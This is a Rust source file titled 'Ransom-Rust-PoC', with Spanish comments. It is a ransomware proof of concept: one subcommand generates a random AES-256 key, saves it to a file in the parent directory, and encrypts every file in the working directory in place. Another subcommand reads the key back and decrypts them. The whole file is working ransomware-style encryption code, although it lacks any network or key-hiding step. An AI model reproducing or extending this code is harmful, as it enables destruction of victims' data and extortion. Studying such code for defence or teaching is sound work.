use aesstream::{AesReader, AesWriter};
use clap::{App, SubCommand};
use crypto::aessafe::{AesSafe256Decryptor, AesSafe256Encryptor};
use rand::{thread_rng, Rng};
use std::fs::{read, read_dir, write, File, OpenOptions};
use std::io::{Read, Write};
use std::path::Path;

fn main() {
    let matches = App::new("Ransom-Rust-PoC")
        .version("0.1")
        .author("Ricardo M. Prieto (rchip)")
        .subcommand(SubCommand::with_name("cifrar"))
        .subcommand(SubCommand::with_name("descifrar"))
        .get_matches();

    if let ("cifrar", Some(_)) = matches.subcommand() {
        println!("{}", "cifrando");
        let key = genera_clave_cifrado();
        // Llamada a generar clave, devuleve la clave de 32bytes
        let cifrar_aes = AesSafe256Encryptor::new(&key);
        // Creamos el cifrador con la clave

        for archivo in read_dir("./").unwrap() {
            // Leemos los archivos que están en el directorio
            let archivo = archivo.unwrap().path();
            // Extraemos el path de cada archivo
            cifrar_archivos(&archivo, cifrar_aes);
            // Ciframos todo archivo en función del path y el cifrador
        }
    }

    if let ("descifrar", Some(_)) = matches.subcommand() {
        println!("{}", "descifrando");
        let mut archivo_clave = File::open("../clave.key").expect("No se puede leer el archivo");
        let mut key: Vec<u8> = Vec::<u8>::new();
        archivo_clave.read_to_end(&mut key).unwrap();
        // Llamada a generar clave, devuleve la clave de 32bytes
        let descifrar_aes = AesSafe256Decryptor::new(&key);
        // Creamos el cifrador con la clave

        for archivo in read_dir("./").unwrap() {
            // Leemos los archivos que están en el directorio
            let archivo = archivo.unwrap().path();
            println!("{:?}", archivo);
            // Extraemos el path de cada archivo
            descifrar_archivos(&archivo, descifrar_aes);
            // Ciframos todo archivo en función del path y el cifrador
        }
    }
}

fn genera_clave_cifrado() -> [u8; 32] {
    let mut clave_file =
        File::create("../clave.key").expect("No se pudo crear el archivo, revise permisos");
    // Creamos un archivo para almacenar la clave de cifrado
    // que se encontrará en el directorio superior
    // al que ejecutamos el programa
    let clave: [u8; 32] = thread_rng().gen();
    // Generamos un vector de tamaño 32 bytes
    // tipo u8
    clave_file
        .write_all(&clave)
        .expect("No se pudo escribir la clave en el archivo, revise permisos");
    // Almacenamos el archivo con la clave cifrada

    return clave;
}

fn cifrar_archivos(path: &Path, cifrar_aes: AesSafe256Encryptor) -> () {
    if let Ok(file) = OpenOptions::new().write(true).open(path) {
        // Comprobar que el archivo se puede abrir como escritura
        if let Ok(content) = read(path) {
            // Comprobamos si podemos leer el contenido del archivo
            if let Ok(mut writer) = AesWriter::new(file, cifrar_aes) {
                // Ciframos el archivo y la data guardamos en writer
                writer.write(&content).unwrap();
                // Realizamos la escritura de datos cifrados al archivo
            }
        }
    }
}

fn descifrar_archivos(path: &Path, descifrar_aes: AesSafe256Decryptor) -> () {
    if let Ok(file) = OpenOptions::new().read(true).write(true).open(path) {
        // Comprobar que el archivo se puede abrir como escritura
        if let Ok(mut reader) = AesReader::new(file, descifrar_aes) {
            // Comprobamos si se puede leer el archivo y descifrar
            let mut contenido: Vec<u8> = Vec::<u8>::new();
            // Generamos un vector que contrendra nuestra data descifrada
            reader.read_to_end(&mut contenido).unwrap();
            // Leemos todo el contenido descifrado
            write(path, contenido).unwrap();
            // Realizamos la escritura de datos descifrados y escribimos al archivo
        }
    }
}
